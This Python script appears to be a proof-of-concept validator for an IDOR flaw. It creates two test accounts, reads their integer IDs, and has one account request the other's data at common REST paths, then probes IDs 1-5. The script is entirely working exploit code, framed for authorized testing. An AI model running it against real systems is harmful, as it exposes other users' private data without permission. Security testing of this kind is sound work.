#!/usr/bin/env python3
"""
PoC: Insecure Direct Object Reference (IDOR) — Integer ID Access Control Bypass

Vulnerability: An authenticated endpoint uses an integer ID in the URL/body
(e.g., GET /api/users/42) to identify a resource, but the server does NOT
verify that the requesting user owns or is permitted to access that resource.
An attacker can enumerate or increment the ID to access other users' data.

Scope: INTEGER-KEYED resources only. UUID-keyed endpoints are excluded because
enumeration is impractical (128-bit random space). Precedent #2 in filtering rules.

Validation strategy:
  1. Authenticate as User A, record their resource ID
  2. Authenticate as User B (or use a second session/token)
  3. User B accesses User A's resource ID directly
  4. Confirmation: User B receives User A's private data (NOT a 403/404)

Usage (authorized testing only, inside Docker):
    python poc_idor_001.py --target http://localhost:3000 --timeout 30

Exit codes:
    0 - CONFIRMED: Cross-user resource access succeeded (IDOR confirmed)
    1 - NOT_REPRODUCED: Server correctly rejected cross-user access
    2 - ERROR: Script error, cannot create test accounts, or target unreachable

IMPORTANT: Only use against systems you have explicit written authorization to test.
This PoC creates two test accounts to demonstrate the access control failure.
"""

import argparse
import secrets
import sys
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] IDOR-001: 'requests' library is required.")
    sys.exit(2)

VULN_ID = "IDOR-001"

# ── Target resource endpoints ──────────────────────────────────────────────────
# These are the most common integer-keyed resource paths in REST APIs.
# The PoC tries /api/users/{id}, /api/profile/{id}, etc.

RESOURCE_ENDPOINTS = [
    "/api/users/{id}",
    "/api/profile/{id}",
    "/api/orders/{id}",
    "/api/messages/{id}",
    "/api/posts/{id}",
    "/api/documents/{id}",
    "/api/invoices/{id}",
    "/api/accounts/{id}",
    "/api/data/{id}",
    "/user/{id}",
    "/profile/{id}",
]

# Auth endpoints to try for creating test accounts
REGISTER_PATHS = ["/api/register", "/api/auth/register", "/api/signup", "/register", "/signup"]
LOGIN_PATHS = ["/api/login", "/api/auth/login", "/api/signin", "/login", "/signin"]
PROFILE_PATHS = ["/api/me", "/api/profile", "/api/user", "/me", "/profile"]


def register_and_login(session: requests.Session, target: str, suffix: str) -> dict | None:
    """Attempt to register + login a test user. Returns auth token/cookie info."""
    username = f"idor_test_{suffix}_{secrets.token_hex(4)}"
    password = secrets.token_hex(12)
    email = f"{username}@test.local"

    credentials = {
        "username": username,
        "password": password,
        "email": email,
        "name": username,
    }

    # Try registration
    for reg_path in REGISTER_PATHS:
        try:
            resp = session.post(
                f"{target}{reg_path}",
                json=credentials,
                timeout=5,
                allow_redirects=False,
            )
            if resp.status_code in (200, 201):
                break
        except RequestException:
            continue

    # Try login
    for login_path in LOGIN_PATHS:
        try:
            resp = session.post(
                f"{target}{login_path}",
                json={"username": username, "password": password},
                timeout=5,
                allow_redirects=False,
            )
            if resp.status_code in (200, 201):
                # Extract token from response body or cookie
                token = None
                try:
                    rjson = resp.json()
                    for key in ("token", "access_token", "accessToken", "jwt", "auth_token"):
                        if key in rjson:
                            token = rjson[key]
                            break
                        if isinstance(rjson.get("data"), dict) and key in rjson["data"]:
                            token = rjson["data"][key]
                            break
                except Exception:
                    pass
                return {
                    "username": username,
                    "password": password,
                    "email": email,
                    "token": token,
                    "cookies": dict(session.cookies),
                    "login_path": login_path,
                }
        except RequestException:
            continue
    return None


def get_user_id(session: requests.Session, target: str, auth_headers: dict) -> int | None:
    """Get the authenticated user's own resource ID."""
    for path in PROFILE_PATHS:
        try:
            resp = session.get(
                f"{target}{path}",
                headers=auth_headers,
                timeout=5,
            )
            if resp.status_code == 200:
                try:
                    rjson = resp.json()
                    for key in ("id", "user_id", "userId", "ID"):
                        val = rjson.get(key) or (rjson.get("data") or {}).get(key)
                        if isinstance(val, int):
                            return val
                except Exception:
                    pass
        except RequestException:
            pass
    return None


def attempt_cross_user_access(
    session: requests.Session,
    target: str,
    auth_headers: dict,
    victim_id: int,
    attacker_id: int | None,
) -> dict | None:
    """Try to access victim's resources using attacker's session."""
    for endpoint_template in RESOURCE_ENDPOINTS:
        url = f"{target}{endpoint_template.replace('{id}', str(victim_id))}"
        try:
            resp = session.get(url, headers=auth_headers, timeout=5)
            if resp.status_code == 200 and resp.text.strip():
                # Confirm it contains data belonging to victim (not attacker)
                try:
                    rjson = resp.json()
                    rtext = str(rjson)
                    # If response contains the victim ID and not an error, it's IDOR
                    if (str(victim_id) in rtext and
                            "error" not in rtext.lower() and
                            "denied" not in rtext.lower() and
                            "forbidden" not in rtext.lower()):
                        return {
                            "url": url,
                            "victim_id": victim_id,
                            "attacker_id": attacker_id,
                            "status_code": resp.status_code,
                            "response_snippet": rtext[:300],
                        }
                except Exception:
                    if resp.status_code == 200:
                        return {
                            "url": url,
                            "victim_id": victim_id,
                            "attacker_id": attacker_id,
                            "status_code": resp.status_code,
                            "response_snippet": resp.text[:300],
                        }
        except RequestException:
            pass
    return None


def run_exploit(target: str, timeout: int) -> tuple[int, dict]:
    print(f"[*] {VULN_ID}: IDOR PoC — cross-user integer ID access")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Creating two test accounts to demonstrate access control failure...")

    session_a = requests.Session()
    session_b = requests.Session()

    try:
        session_a.get(target, timeout=10)
    except RequestException as e:
        print(f"[ERROR] {VULN_ID}: Target unreachable: {e}")
        return 2, {}

    # Register/login User A (victim)
    print(f"[*] {VULN_ID}: Registering User A (victim)...")
    user_a = register_and_login(session_a, target, "A")
    if not user_a:
        print(f"[WARN] {VULN_ID}: Could not create User A — checking existing low IDs instead")
        # Fallback: no auth registration available, test without auth
        user_a = {"token": None, "username": "anonymous"}

    # Register/login User B (attacker)
    print(f"[*] {VULN_ID}: Registering User B (attacker)...")
    user_b = register_and_login(session_b, target, "B")
    if not user_b:
        print(f"[WARN] {VULN_ID}: Could not create User B")

    # Build auth headers
    def make_headers(user: dict | None) -> dict:
        if user and user.get("token"):
            return {"Authorization": f"Bearer {user['token']}"}
        return {}

    headers_a = make_headers(user_a)
    headers_b = make_headers(user_b)

    # Get User A's ID
    id_a = None
    if headers_a:
        id_a = get_user_id(session_a, target, headers_a)
        if id_a:
            print(f"[*] {VULN_ID}: User A has resource ID: {id_a}")

    # Get User B's ID
    id_b = None
    if headers_b:
        id_b = get_user_id(session_b, target, headers_b)
        if id_b:
            print(f"[*] {VULN_ID}: User B has resource ID: {id_b}")

    # Cross-access attempt: User B tries to access User A's data
    if id_a and id_b and id_a != id_b:
        print(f"[*] {VULN_ID}: User B attempting to access User A's resource ID {id_a}...")
        evidence = attempt_cross_user_access(session_b, target, headers_b, id_a, id_b)
        if evidence:
            print(f"[CONFIRMED] {VULN_ID}: IDOR confirmed — User B accessed User A's resource!")
            print(f"[CONFIRMED] {VULN_ID}: URL: {evidence['url']}")
            print(f"[CONFIRMED] {VULN_ID}: No ownership check — server returned HTTP 200")
            return 0, evidence

    # Fallback: enumerate low integer IDs without authentication (public IDOR)
    print(f"[*] {VULN_ID}: Fallback — testing unauthenticated access to low integer IDs...")
    for test_id in range(1, 6):
        if test_id == id_b:
            continue
        evidence = attempt_cross_user_access(session_b, target, headers_b, test_id, id_b)
        if evidence:
            print(f"[CONFIRMED] {VULN_ID}: IDOR confirmed — accessed resource ID {test_id}!")
            return 0, evidence

    print(f"[-] {VULN_ID}: Cross-user access blocked (server correctly enforces ownership)")
    print(f"[*] {VULN_ID}: Verify: GET /api/users/<other_id> returns 403 with any auth token")
    return 1, {}


def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"PoC for IDOR ({VULN_ID}) — integer-keyed cross-user resource access",
        epilog="For authorized security testing only. Creates two test accounts.",
    )
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    if exit_code == 0:
        print(f"[CONFIRMED] {VULN_ID}: IDOR confirmed (CVSS 6.5)")
    elif exit_code == 1:
        print(f"[NOT_REPRODUCED] {VULN_ID}: IDOR not reproduced")
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
